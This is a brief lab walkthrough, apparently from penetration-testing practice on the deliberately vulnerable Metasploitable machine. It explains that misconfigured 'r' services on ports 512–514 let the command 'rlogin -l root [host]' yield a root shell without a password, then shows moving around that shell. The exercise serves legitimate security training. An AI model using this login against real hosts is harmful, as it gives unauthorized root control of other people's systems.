Note : TCP ports 512,513,and 514 are known as "r" services, and have been misconfigured to allow remote access from any host.(basically rhs means remote shell) 

command: rlogin -l root [host]
 #now we login as root user. we'll have root shell of metasploitable system(root@metasploitable:~#). 

root@metasploitable:~# pwd      // this shows where we are(/root)
root@metasploitable:~# cd /home/msfadmin
  
 ### we can cantroll it from now.
